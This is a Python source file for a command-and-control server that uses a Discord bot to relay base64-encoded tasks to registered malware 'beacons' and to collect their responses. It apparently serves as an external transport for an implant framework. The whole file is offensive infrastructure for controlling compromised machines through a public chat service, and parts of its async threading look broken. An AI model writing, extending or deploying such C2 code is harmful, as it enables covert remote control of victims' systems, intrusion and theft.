import discord
import asyncio
import argparse
from utils import commonUtils
from utils.encoders import encoder_base64
from time import sleep
import establishedSession
import config
from threading import Thread

# Discord bot token
DISCORD_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'
COMMAND_CHANNEL_ID = 1234567890  # Replace with your channel ID where you'll send tasks

# Global dictionary to store beacon sessions
beacons = {}

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)

def importModule(modName, modType):
    """
    Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
    """
    prep_global = "global " + modType
    exec(prep_global)
    importName = "import utils." + modType + "s." + modName + " as " + modType
    exec(importName, globals())

def createConnection(beaconId):
    """
    Function responsible for configuring the initial stager for an incoming connection.
    Returns:
        discord client connection for issuing tasks.
    """
    # In Discord C2, the connection is through a Discord channel/message interaction
    if config.verbose:
        print(f"Establishing connection for beacon {beaconId}")
    return beaconId  # For Discord, the connection is tied to the beacon ID

async def sendTask(channel, task, beaconId):
    """
    Sends a task to the beacon via a Discord message.
    """
    encoded_task = encoder_base64.encode(task)
    await channel.send(f"Task for {beaconId}: {encoded_task}")

async def fetchResponse(channel, beaconId):
    """
    Fetch responses from the beacon via Discord messages.
    """
    async for message in channel.history(limit=100):  # Adjust limit as needed
        if message.content.startswith(f"Response from {beaconId}:"):
            encoded_response = message.content.split(f"Response from {beaconId}: ")[1]
            return encoder_base64.decode(encoded_response)
    return None

def taskLoop(beaconId, channel):
    while True:
        if config.verbose:
            print(commonUtils.color(f"Checking for tasks for {beaconId}..."))

        # Get the new task (this could be from the Discord command channel)
        newTask = establishedSession.checkForTasks(beaconId)

        # Relay the task to the client
        if config.debug:
            print(commonUtils.color(f"Relaying task to {beaconId}"))
        
        # Sending task via Discord
        asyncio.run(sendTask(channel, newTask, beaconId))

        if config.verbose:
            print(commonUtils.color(f"Checking for response from {beaconId}..."))

        # Fetch and process responses
        response = asyncio.run(fetchResponse(channel, beaconId))
        if response:
            establishedSession.relayResponse(beaconId, response)

        # Sleep to avoid constant polling
        sleep(config.C2_BLOCK_TIME / 100)

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')

@client.event
async def on_message(message):
    """
    Triggered when the bot receives a message.
    This function checks for new agents (beacons) registering and processes tasks/responses.
    """
    if message.author == client.user:
        return  # Ignore own messages

    if message.channel.id == COMMAND_CHANNEL_ID:
        if message.content.startswith("AGENT:"):
            beaconId = message.content.split("AGENT:")[1]
            print(f"New agent registered: {beaconId}")

            # Start a new task loop for this agent
            if beaconId not in beacons:
                print(f"[+] Established new session {beaconId}. Starting task loop.")
                channel = message.channel
                sock = createConnection(beaconId)
                t = Thread(target=taskLoop, args=(beaconId, channel))
                t.daemon = True
                t.start()
                beacons[beaconId] = sock

def main():
    # Argparse for certain options
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', action='store_true', help='Enable verbose output', dest='verbose', default=False)
    parser.add_argument('-d', action='store_true', help='Enable debugging output', dest='debug', default=False)

    args = parser.parse_args()

    # Assign the arguments to config.$ARGNAME
    if not config.verbose:
        config.verbose = args.verbose
    if not config.debug:
        config.debug = args.debug

    if config.debug:
        config.verbose = True

    # Import encoder and transport modules
    if config.verbose:
        print(commonUtils.color("Importing encoder module: ") + "%s" % config.ENCODER_MODULE)
    importModule(config.ENCODER_MODULE, "encoder")

    if config.verbose:
        print(commonUtils.color("Importing transport module: ") + "%s" % config.TRANSPORT_MODULE)
    importModule(config.TRANSPORT_MODULE, "transport")

    # Start the Discord bot
    client.run(DISCORD_TOKEN)

if __name__ == "__main__":
    main()
